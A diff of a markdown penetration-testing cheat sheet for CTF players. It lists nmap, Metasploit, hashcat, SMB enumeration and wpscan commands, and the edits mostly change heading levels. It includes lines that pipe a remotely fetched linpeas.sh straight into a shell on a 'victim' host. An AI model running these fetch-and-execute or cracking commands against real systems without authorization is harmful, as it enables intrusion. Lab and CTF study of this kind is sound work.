@@ -11,6 +11,8 @@ category: Hacking 101
 Linux commands that are often used by hackers, security professional and CTF players. We will avoid any payloads or oneliner exploits ( will cover in different page sometime).
 Updated - October 02, 2023.
 
+#### Table of Contents
+
 ### Add Target to hosts file
 
 ```bash
@@ -45,7 +47,7 @@ sudo nmap -sU -sV -p- -T5 -Pn targethost
 
 
 
-## Metasploit
+### Metasploit
 
 Start Metasploit with database
 ```bash
@@ -63,7 +65,7 @@ Creating configuration file in /usr/share/metasploit-framework/config/database.y
 Creating initial database schema
 ```
 
-### Metasploit Shell Upgrade to Meterpreter
+#### Metasploit Shell Upgrade to Meterpreter
 
 ```bash
 sessions -u 3
@@ -89,7 +91,7 @@ hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt.gz
 
 
 
-## Extract Files
+### Extract Files
 
 Gz Files
 
@@ -102,20 +104,20 @@ tar Files
 tar –xvzf archive.tar.gz
 ```
 
-## SSH Connection 
+### SSH Connection 
 
 ```bash
 ssh username@host -oHostKeyAlgorithms=+ssh-dss
 ```
 
 
-## Text Filter
+### Text Filter
 
 ```bash
 grep -i #]- inlcude
 grep -v #]- exclude
 ```
-## SMB Enumeration
+### SMB Enumeration
 
 nmap
 
@@ -134,15 +136,15 @@ make directory locally and mount it
 mkdir /mnt/sampleDIR
 sudo mount IP:/folder /mnt/sampleDIR
 ```
-## netcat
+### netcat
 
 get version via banner
 ```bash
 nc IP port
 ```
-## Linpeas
+### Linpeas
 
-# From github
+#### From github
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 ### Python Simple HTTP Server
@@ -159,7 +161,7 @@ curl 10.10.10.10/linpeas.sh | sh #Victim
 wpscan --url https://brainfuck.htb --disable-tls-checks
 ```
 
-## Directory Enumeration
+### Directory Enumeration
 
 ```bash
 ┌──(abhinav㉿ETHICALHACKX)-[~]
@@ -171,7 +173,7 @@ wpscan --url https://brainfuck.htb --disable-tls-checks
 
 ```
 
-## Reading a File
+### Reading a File
 
 ```bash
 cat
@@ -182,10 +184,9 @@ tail -20 filename
 cat filename | grep "word_to_filter"
 more
 less
-
 ```
 
-## Replace in File
+### Replace in File
 
 ```bash
 sed /s/wordtoreplace/wordtoreplacewith/g /filepath > outputfilepath
